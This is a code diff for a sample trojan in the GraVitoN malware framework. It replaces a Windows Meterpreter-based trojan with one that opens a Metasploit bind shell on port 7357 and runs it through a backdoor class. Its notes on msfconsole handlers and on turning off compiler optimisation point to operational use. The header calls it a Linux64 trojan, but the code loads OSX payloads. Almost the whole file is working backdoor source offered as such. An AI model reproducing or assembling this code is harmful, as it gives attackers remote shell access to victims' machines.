@@ -19,50 +19,44 @@
  * You should have received a copy of the GNU General Public License
  * along with Graviton.  If not, see http://www.gnu.org/licenses/.
  *
- * @brief GraVitoN Sample Win32 Trojan
- *
+ * @brief GraVitoN - Sample Linux64 Trojan
+ * 
  * @section Note
  * 1. Disable g++ optimization (make <...> CPPFLAGS=-O0 |or| g++ <..> -O0) \n
  * 2. If you are using msfconsole/exploit/multi/handler, push Ctrl+Z in case of sending a session to background. \n
  */
 
+
 /// Activate/Deactivate GraVitoN logger
-//#define GVN_ACTIVATE_LOGGER
+// #define GVN_ACTIVATE_LOGGER
 /// Print logs into a file
 //#define GVN_LOG_INTO_FILE
 /// Path to Log File
 //#define GVN_LOG_FILE "./graviton_logs.txt"
 
-
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-#include <windows.h>
-#include "../../../graviton.hpp"
-#include "../../../gvn_payload/windows/gvn_payload_meter_w32b_kasper.hpp"
-#include "../../../gvn_ai/gvn_ai_trojan_sample.hpp"
+#include <graviton.hpp>
+#include <payload/osx/msf_shell_bind_32.hpp>
+// #include <payload/osx/dos_32.hpp>
+#include <ai/backdoor_sample.hpp>
 #include <iostream>
 using namespace std;
 
-class My_Trojan_AI : public AI_Trojan_Sample
-{
-protected:
-	virtual bool initializeInternalComponents()
-	{
-		payload = new Payload_Meter_W32b_Kasper();
-		payload->initialize(options);
-	}
-};
-
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-int WinMain(HINSTANCE inst, HINSTANCE previ, LPSTR cmd, int ncmd)
+int main()
 {
-	GraVitoN::Logger::logItLn ( "main -> AI" );
+    GraVitoN::Core::Logger::logItLn ( "main -> Started" );
 
-	My_Trojan_AI ai;
+    GraVitoN::Payload::OSX_MSF_Shell_Bind_32 msfpay;
+    msfpay.initialize(7357);
+    // GraVitoN::Payload::OSX_DoS_32 msfpay;
+    // msfpay.initialize();
 
-	ai.initialize("PORT=7357");
-    ai.run();
+    GraVitoN::AI::Backdoor_Sample backy(msfpay);
 
-    GraVitoN::Logger::logItLn ( "main -> done" );
-	
+    backy.run();
+
+    GraVitoN::Core::Logger::logItLn ( "main -> done" );
+
     return 0;
 }
